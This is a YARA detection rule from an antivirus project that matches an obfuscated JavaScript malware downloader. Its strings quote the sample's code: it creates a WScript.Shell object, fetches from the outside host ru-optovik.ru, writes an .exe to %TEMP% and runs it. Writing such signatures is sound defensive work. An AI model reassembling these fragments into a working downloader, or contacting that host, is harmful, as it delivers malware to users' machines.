rule sig_20160330_ea4ce6c0ac69ad4e4b46426d276a5941 {
  meta:
    description = "datamaliciousorder - file 20160330_ea4ce6c0ac69ad4e4b46426d276a5941.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b6b117b5ca29ca1d07ef098f39282089182142fb65894d1d3b373eccf335719e"

  strings:
    $s1  = "var _J = function _GI() {return WScript[_FG](\"WScript\"+\".Shell\");}(), _RS = 11;" fullword ascii
    $s2  = "_R0[_M](\"GET\", \"http://ru-optovik.ru/j9ssl\", false);" fullword ascii
    $s3  = "function _KS(_OK, _Z){_QG = _QG * 1; return _OK - _Z;};" fullword ascii
    $s4  = "if (_R0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _EN(){return _UG + \"\";};" fullword ascii
    $s6  = "function _TZ() {return _J[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"9gkoPjATAKClZSm.ex\" + \"e\";};" fullword ascii
    $s7  = "function _FL() {return ((_HW == true) && (_HW == _Q)) ? 1 : _QG;};" fullword ascii
    $s8  = "function _B0(_E){_J[\"Run\"](_E, _QG, _QG);};" fullword ascii
    $s9  = "function _R()" fullword ascii
    $s10 = "return _KS(_NH, _O);" fullword ascii
    $s11 = "var _GC = new this[\"Date\"]();" fullword ascii
    $s12 = "function _SR(){return 22;};" fullword ascii
    $s13 = "function _B(_VU) {var _JG = (1, 2, 3, 4, 5, _VU); return _JG;};" fullword ascii
    $s14 = " while (_MS){" fullword ascii
    $s15 = "function _S(){return _FG;};" fullword ascii
    $s16 = "_Q = true; " fullword ascii
    $s17 = "var _Q = false;" fullword ascii
    $s18 = "var _S0 = false;" fullword ascii
    $s19 = "var _HW = false;" fullword ascii
    $s20 = "_HW = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}